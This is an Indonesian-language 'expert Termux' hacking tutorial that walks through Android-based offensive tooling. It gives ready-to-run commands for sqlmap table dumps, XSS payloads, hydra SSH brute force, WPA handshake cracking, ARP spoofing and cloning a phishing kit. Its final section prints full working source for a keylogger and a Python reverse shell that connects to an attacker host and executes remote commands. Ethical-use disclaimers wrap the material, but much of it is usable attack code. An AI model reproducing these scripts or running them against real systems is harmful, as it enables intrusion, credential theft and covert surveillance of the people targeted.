# 🔥 ADVANCED TERMUX: Tutorial Level Expert
## Teknik Rahasia yang Bikin Orang Terheran-heran

> **WARNING**: Tutorial ini untuk educational purposes dan ethical use only!
> Gunakan dengan tanggung jawab. Penyalahgunaan adalah tanggung jawab user.

---

## 📚 Table of Contents

1. [Setup Environment Pro](#1-setup-environment-pro)
2. [Network Penetration Testing](#2-network-penetration-testing)
3. [Web Application Security Testing](#3-web-application-security-testing)
4. [Social Engineering Toolkit](#4-social-engineering-toolkit)
5. [Anonymous Browsing & Privacy](#5-anonymous-browsing--privacy)
6. [Advanced Automation](#6-advanced-automation)
7. [Mobile Forensics](#7-mobile-forensics)
8. [Wireless Hacking (WiFi Analysis)](#8-wireless-hacking-wifi-analysis)
9. [Cryptography & Steganography](#9-cryptography--steganography)
10. [Build Your Own Tools](#10-build-your-own-tools)

---

## 1. Setup Environment Pro

### 1.1 Install Kali NetHunter di Termux

Ini yang paling WOW! Full Kali Linux di Android tanpa root!

```bash
# Update repository
pkg update && pkg upgrade -y

# Install dependencies
pkg install wget curl proot tar -y

# Download NetHunter installer
wget -O install-nethunter-termux https://offs.ec/2MceZWr

# Jalankan installer
chmod +x install-nethunter-termux
./install-nethunter-termux

# Masuk ke Kali NetHunter
nethunter
```

**Hasil**: Full Kali Linux dengan 600+ hacking tools!

### 1.2 Setup Multiple Linux Distros

```bash
# Install proot-distro
pkg install proot-distro -y

# List distro available
proot-distro list

# Install berbagai distro
proot-distro install ubuntu
proot-distro install debian
proot-distro install arch
proot-distro install alpine

# Login ke distro
proot-distro login ubuntu

# Multi-distro shortcut
echo "alias ubuntu='proot-distro login ubuntu'" >> ~/.bashrc
echo "alias debian='proot-distro login debian'" >> ~/.bashrc
echo "alias arch='proot-distro login arch'" >> ~/.bashrc
```

### 1.3 Custom Hacking Environment

```bash
# Install tools essential
pkg install python python-pip git nodejs golang rust -y
pkg install nmap hydra sqlmap metasploit openssh -y
pkg install aircrack-ng wireshark-cli tcpdump -y

# Install python security libraries
pip install scapy requests beautifulsoup4 selenium
pip install pwntools paramiko cryptography
pip install impacket python-nmap

# Setup workspace
mkdir -p ~/security/{recon,exploit,payload,loot,reports}
```

---

## 2. Network Penetration Testing

### 2.1 Network Reconnaissance

**Scan jaringan sekitar (WiFi sendiri!)**

```bash
# Install nmap
pkg install nmap -y

# Scan network
ip addr show # cek IP kamu
nmap -sn 192.168.1.0/24 # scan semua device

# Advanced scan
nmap -sV -sC -O -A 192.168.1.1 # scan router detail
nmap -p- 192.168.1.255 # scan all ports target

# Save results
nmap -oN scan_results.txt 192.168.1.0/24
```

### 2.2 Port Scanning & Service Detection

```bash
# Fast scan
nmap -F targetIP

# Specific ports
nmap -p 80,443,22,21,3306 targetIP

# UDP scan
nmap -sU targetIP

# OS detection
nmap -O targetIP

# Script scanning
nmap --script vuln targetIP
```

### 2.3 ARP Spoofing Detection

```bash
pkg install arpspoof -y

# Monitor ARP traffic
arpspoof -i wlan0 -t targetIP gatewayIP

# Detect ARP spoofing
arp-scan --interface=wlan0 --localnet
```

### 2.4 DNS Enumeration

```bash
pkg install dnsutils -y

# Basic DNS lookup
nslookup example.com

# DNS zone transfer
dig axfr @dns-server domain.com

# Subdomain enumeration
cat > subdomains.txt << EOF
www
mail
ftp
admin
dev
test
api
EOF

while read subdomain; do
  host $subdomain.example.com
done < subdomains.txt
```

---

## 3. Web Application Security Testing

### 3.1 SQL Injection Testing

```bash
pkg install sqlmap -y

# Basic SQLi test
sqlmap -u "http://target.com/page?id=1"

# Advanced options
sqlmap -u "http://target.com/page?id=1" --dbs --batch
sqlmap -u "http://target.com/page?id=1" -D database --tables
sqlmap -u "http://target.com/page?id=1" -D database -T users --dump

# POST request SQLi
sqlmap -u "http://target.com/login" --data="username=admin&password=pass"
```

### 3.2 XSS (Cross-Site Scripting) Testing

```bash
# Manual XSS payloads
cat > xss_payloads.txt << 'EOF'
<script>alert('XSS')</script>
<img src=x onerror=alert('XSS')>
<svg onload=alert('XSS')>
javascript:alert('XSS')
<iframe src="javascript:alert('XSS')">
EOF

# Test dengan curl
while read payload; do
  curl -s "http://target.com/search?q=$payload" | grep -i "XSS"
done < xss_payloads.txt
```

### 3.3 Directory Bruteforce

```bash
pkg install dirb -y

# Scan directories
dirb http://target.com

# Custom wordlist
dirb http://target.com /path/to/wordlist.txt

# With extensions
dirb http://target.com -X .php,.html,.txt
```

### 3.4 Web Vulnerability Scanner

```bash
# Install Nikto
pkg install nikto -y

# Scan website
nikto -h http://target.com

# Full scan with output
nikto -h http://target.com -o scan_result.html -Format html
```

### 3.5 API Testing

```bash
# Install httpie
pkg install httpie -y

# Test API endpoints
http GET https://api.target.com/users
http POST https://api.target.com/login username=test password=test

# JWT token testing
TOKEN="eyJhbGc..."
http GET https://api.target.com/admin Authorization:"Bearer $TOKEN"
```

---

## 4. Social Engineering Toolkit

### 4.1 Information Gathering (OSINT)

```bash
# Install tools
pip install holehe sherlock social-analyzer

# Email OSINT
holehe target@email.com

# Username OSINT
sherlock username

# Phone number OSINT
pkg install phoneinfoga -y
phoneinfoga scan -n +628123456789
```

### 4.2 Phishing Page Generator (Educational Only!)

```bash
# Install SocialFish
git clone https://github.com/UndeadSec/SocialFish.git
cd SocialFish
pip install -r requirements.txt

# JANGAN gunakan untuk phishing real!
# Ini untuk understanding how phishing works
```

### 4.3 Fake Login Page Detector

```bash
# Script untuk detect phishing
cat > detect_phish.py << 'EOF'
import requests
from bs4 import BeautifulSoup
import sys

def check_phishing(url):
    try:
        r = requests.get(url, timeout=5)
        soup = BeautifulSoup(r.content, 'html.parser')
        
        # Check for password field
        passwords = soup.find_all('input', {'type': 'password'})
        
        # Check SSL
        is_https = url.startswith('https')
        
        # Check suspicious keywords
        suspicious = ['verify', 'confirm', 'update', 'secure']
        content = r.text.lower()
        found_suspicious = [word for word in suspicious if word in content]
        
        print(f"URL: {url}")
        print(f"HTTPS: {is_https}")
        print(f"Password fields: {len(passwords)}")
        print(f"Suspicious words: {found_suspicious}")
        
        if not is_https and len(passwords) > 0:
            print("⚠️  WARNING: Potential phishing!")
        else:
            print("✓ Looks safe")
    except Exception as e:
        print(f"Error: {e}")

if __name__ == "__main__":
    if len(sys.argv) > 1:
        check_phishing(sys.argv[1])
    else:
        print("Usage: python detect_phish.py <url>")
EOF

python detect_phish.py http://suspicious-site.com
```

---

## 5. Anonymous Browsing & Privacy

### 5.1 Setup Tor Network

```bash
# Install Tor
pkg install tor -y

# Konfigurasi
mkdir -p ~/.tor
cat > ~/.tor/torrc << EOF
SOCKSPort 9050
ControlPort 9051
CookieAuthentication 1
EOF

# Jalankan Tor
tor -f ~/.tor/torrc

# Proxy semua traffic lewat Tor
export http_proxy=socks5://127.0.0.1:9050
export https_proxy=socks5://127.0.0.1:9050

# Test IP
curl https://check.torproject.org/api/ip
```

### 5.2 Proxychains

```bash
pkg install proxychains-ng -y

# Konfigurasi
nano /data/data/com.termux/files/usr/etc/proxychains.conf

# Tambahkan:
# socks5 127.0.0.1 9050

# Gunakan dengan command lain
proxychains nmap targetIP
proxychains curl https://ipinfo.io
```

### 5.3 MAC Address Changer

```bash
# Install macchanger
pkg install macchanger -y

# Cek MAC address
ip link show wlan0

# Change MAC (need root)
# macchanger -r wlan0
```

### 5.4 VPN Setup

```bash
pkg install openvpn -y

# Download config dari VPN provider
# Jalankan VPN
openvpn --config your-vpn-config.ovpn
```

---

## 6. Advanced Automation

### 6.1 Auto Recon Script

```bash
cat > auto_recon.sh << 'EOF'
#!/bin/bash

TARGET=$1
OUTPUT_DIR="recon_$(date +%Y%m%d_%H%M%S)"

if [ -z "$TARGET" ]; then
    echo "Usage: $0 <target>"
    exit 1
fi

mkdir -p $OUTPUT_DIR
cd $OUTPUT_DIR

echo "[*] Starting reconnaissance on $TARGET"

# Nmap scan
echo "[+] Running nmap scan..."
nmap -sV -sC -oN nmap_scan.txt $TARGET

# DNS enum
echo "[+] DNS enumeration..."
dig $TARGET > dns_info.txt
host $TARGET >> dns_info.txt

# Web scan
echo "[+] Web scanning..."
curl -I https://$TARGET > web_headers.txt
nikto -h https://$TARGET -o nikto_scan.html -Format html

# WHOIS
echo "[+] WHOIS lookup..."
whois $TARGET > whois_info.txt

# SSL check
echo "[+] SSL certificate check..."
echo | openssl s_client -connect $TARGET:443 2>/dev/null | openssl x509 -noout -text > ssl_cert.txt

echo "[✓] Reconnaissance complete!"
echo "[*] Results saved in: $OUTPUT_DIR"
EOF

chmod +x auto_recon.sh
./auto_recon.sh target.com
```

### 6.2 Automated Vulnerability Scanner

```bash
cat > vuln_scanner.sh << 'EOF'
#!/bin/bash

TARGET=$1

echo "=== Vulnerability Scanner ==="
echo "Target: $TARGET"
echo ""

# SQL Injection test
echo "[1] Testing SQL Injection..."
sqlmap -u "$TARGET" --batch --level=1 --risk=1 > sqli_test.txt 2>&1
if grep -q "vulnerable" sqli_test.txt; then
    echo "⚠️  SQLi vulnerability found!"
fi

# XSS test
echo "[2] Testing XSS..."
# Add your XSS testing logic

# Open ports
echo "[3] Checking open ports..."
nmap -p- --open $TARGET -oN ports.txt

echo ""
echo "Scan complete!"
EOF

chmod +x vuln_scanner.sh
```

### 6.3 Password Cracking Automation

```bash
# Install John the Ripper
pkg install john -y

# Crack password hash
cat > hashes.txt << EOF
admin:5f4dcc3b5aa765d61d8327deb882cf99
user:098f6bcd4621d373cade4e832627b4f6
EOF

john hashes.txt --format=raw-md5

# Hydra brute force
pkg install hydra -y

# SSH brute force (own server only!)
hydra -l admin -P /path/to/wordlist.txt ssh://192.168.1.100
```

---

## 7. Mobile Forensics

### 7.1 Android Debug Bridge (ADB)

```bash
pkg install android-tools -y

# Connect via WiFi
adb connect 192.168.1.100:5555

# List devices
adb devices

# Pull data
adb pull /sdcard/DCIM/ ./photos/

# Shell access
adb shell

# Dump system info
adb shell dumpsys > device_info.txt
```

### 7.2 APK Analysis

```bash
# Install apktool
pkg install apktool -y

# Decompile APK
apktool d app.apk -o app_decompiled

# Analyze code
cd app_decompiled
grep -r "password" .
grep -r "api_key" .
grep -r "http://" .
```

### 7.3 Network Traffic Analysis

```bash
pkg install tcpdump -y

# Capture traffic (need root)
# tcpdump -i wlan0 -w capture.pcap

# Analyze pcap file
pkg install tshark -y
tshark -r capture.pcap
```

---

## 8. Wireless Hacking (WiFi Analysis)

### 8.1 WiFi Network Scanner

```bash
pkg install aircrack-ng -y

# Scan WiFi networks
# airmon-ng start wlan0 (need root)
# airodump-ng wlan0mon

# Monitor specific network
# airodump-ng --bssid XX:XX:XX:XX:XX:XX -c 6 wlan0mon
```

### 8.2 WPS Testing

```bash
# Install reaver
pkg install reaver -y

# Test WPS vulnerability (own network only!)
# reaver -i wlan0mon -b XX:XX:XX:XX:XX:XX -vv
```

### 8.3 WiFi Password Recovery

```bash
# Crack WPA/WPA2 handshake
# aircrack-ng -w wordlist.txt -b XX:XX:XX:XX:XX:XX capture.cap
```

**PENTING**: Hanya test di network sendiri! Illegal untuk hack WiFi orang lain!

---

## 9. Cryptography & Steganography

### 9.1 File Encryption

```bash
pkg install openssl -y

# Encrypt file
openssl enc -aes-256-cbc -salt -in secret.txt -out secret.enc

# Decrypt file
openssl enc -d -aes-256-cbc -in secret.enc -out secret.txt

# Generate secure password
openssl rand -base64 32
```

### 9.2 Steganography

```bash
pkg install steghide -y

# Hide file in image
steghide embed -cf cover.jpg -ef secret.txt

# Extract hidden file
steghide extract -sf cover.jpg
```

### 9.3 Hash Cracking

```bash
# MD5
echo -n "password" | md5sum

# SHA256
echo -n "password" | sha256sum

# Compare hash
echo "5f4dcc3b5aa765d61d8327deb882cf99" > hash.txt
john --format=raw-md5 hash.txt
```

### 9.4 Create Custom Cipher

```bash
cat > cipher.py << 'EOF'
def encrypt(text, shift):
    result = ""
    for char in text:
        if char.isalpha():
            ascii_offset = 65 if char.isupper() else 97
            result += chr((ord(char) - ascii_offset + shift) % 26 + ascii_offset)
        else:
            result += char
    return result

def decrypt(text, shift):
    return encrypt(text, -shift)

# Usage
plaintext = "Hello World"
encrypted = encrypt(plaintext, 13)
print(f"Encrypted: {encrypted}")
print(f"Decrypted: {decrypt(encrypted, 13)}")
EOF

python cipher.py
```

---

## 10. Build Your Own Tools

### 10.1 Port Scanner

```bash
cat > portscan.py << 'EOF'
#!/usr/bin/env python3
import socket
import sys
from datetime import datetime

def scan_port(target, port):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(1)
        result = sock.connect_ex((target, port))
        sock.close()
        return result == 0
    except:
        return False

def main():
    if len(sys.argv) < 2:
        print("Usage: python3 portscan.py <target>")
        sys.exit(1)
    
    target = sys.argv[1]
    print(f"Scanning {target}")
    print("-" * 50)
    
    start = datetime.now()
    
    for port in range(1, 1025):
        if scan_port(target, port):
            print(f"Port {port}: OPEN")
    
    end = datetime.now()
    print(f"\nScan completed in {end - start}")

if __name__ == "__main__":
    main()
EOF

chmod +x portscan.py
python3 portscan.py 192.168.1.1
```

### 10.2 Web Crawler

```bash
cat > crawler.py << 'EOF'
#!/usr/bin/env python3
import requests
from bs4 import BeautifulSoup
from urllib.parse import urljoin, urlparse
import sys

visited = set()

def crawl(url, max_depth=2, current_depth=0):
    if current_depth > max_depth or url in visited:
        return
    
    visited.add(url)
    print(f"{'  ' * current_depth}Crawling: {url}")
    
    try:
        response = requests.get(url, timeout=5)
        soup = BeautifulSoup(response.content, 'html.parser')
        
        for link in soup.find_all('a', href=True):
            next_url = urljoin(url, link['href'])
            if urlparse(next_url).netloc == urlparse(url).netloc:
                crawl(next_url, max_depth, current_depth + 1)
    except Exception as e:
        print(f"Error: {e}")

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("Usage: python3 crawler.py <url>")
        sys.exit(1)
    
    crawl(sys.argv[1])
    print(f"\nTotal URLs found: {len(visited)}")
EOF

python3 crawler.py https://example.com
```

### 10.3 Keylogger (Educational - Test on Your Own Device!)

```bash
cat > keylogger.py << 'EOF'
#!/usr/bin/env python3
from pynput import keyboard
import logging

logging.basicConfig(filename="keylog.txt", level=logging.DEBUG, format="%(asctime)s: %(message)s")

def on_press(key):
    try:
        logging.info(str(key.char))
    except AttributeError:
        logging.info(str(key))

with keyboard.Listener(on_press=on_press) as listener:
    listener.join()
EOF

# HANYA untuk testing di device sendiri!
# pip install pynput
# python3 keylogger.py
```

### 10.4 Reverse Shell (Penetration Testing Only!)

```bash
cat > reverse_shell.py << 'EOF'
#!/usr/bin/env python3
import socket
import subprocess
import sys

def reverse_shell(host, port):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((host, port))
    
    while True:
        command = s.recv(1024).decode()
        if command.lower() == 'exit':
            break
        
        output = subprocess.getoutput(command)
        s.send(output.encode())
    
    s.close()

if __name__ == "__main__":
    # Usage: python3 reverse_shell.py <attacker_ip> <port>
    if len(sys.argv) < 3:
        print("Usage: python3 reverse_shell.py <host> <port>")
        sys.exit(1)
    
    reverse_shell(sys.argv[1], int(sys.argv[2]))
EOF

# Test dengan nc -lvp 4444 di device lain
```

---

## 🎯 Advanced Projects

### Project 1: Automated Security Audit Tool

Combine semua tools di atas jadi satu automated security auditor.

### Project 2: Bug Bounty Reconnaissance Framework

Build framework untuk bug bounty hunting dengan automation penuh.

### Project 3: Custom Exploit Development

Learn buffer overflow, shellcode, dan exploit development.

### Project 4: Android Malware Analysis Lab

Setup lab untuk analyze malware (safe environment).

---

## ⚠️ LEGAL DISCLAIMER

**PENTING - BACA INI!**

1. **Hanya gunakan di sistem/network sendiri**
2. **Dapatkan written permission sebelum testing sistem orang lain**
3. **Ilegal untuk hack tanpa izin** - bisa kena UU ITE pasal 30
4. **Untuk educational purposes only**
5. **Penulis tidak bertanggung jawab atas penyalahgunaan**

### Cara Legal Menggunakan Skills Ini:

✅ **Bug Bounty Programs**:
- HackerOne
- Bugcrowd
- Synack
- YesWeHack

✅ **Penetration Testing Jobs**:
- Certified Ethical Hacker (CEH)
- Offensive Security Certified Professional (OSCP)
- CompTIA Security+

✅ **CTF Competitions**:
- PicoCTF
- HackTheBox
- TryHackMe
- CTFtime

---

## 📚 Learning Resources

### Books:
- The Web Application Hacker's Handbook
- Metasploit: The Penetration Tester's Guide
- The Hacker Playbook Series

### Online Platforms:
- HackTheBox.eu
- TryHackMe.com
- PentesterLab.com
- PortSwigger Web Security Academy

### YouTube Channels:
- IppSec
- LiveOverflow
- John Hammond
- NetworkChuck

### Communities:
- r/netsec
- r/hacking (educational)
- r/AskNetsec
- InfoSec Twitter

---

## 🚀 Next Steps

1. **Master the basics** - jangan skip fundamentals
2. **Practice legally** - gunakan lab environments
3. **Get certified** - CEH, OSCP, atau Security+
4. **Join bug bounty** - earn money legally
5. **Build portfolio** - document your projects
6. **Network** - join cybersecurity communities

---

## 💡 Pro Tips

1. **Always stay updated** - security landscape berubah cepat
2. **Document everything** - bikin notes dari setiap learning
3. **Think like attacker, defend like defender**
4. **Automate repetitive tasks** - write scripts
5. **Never stop learning** - cybersecurity is lifelong learning

---

**Remember**: With great power comes great responsibility!

Use these skills for good, not evil. Happy (ethical) hacking! 🔐

---

*Tutorial created: jeeyhosting October 2025*
*For educational and authorized penetration testing only*
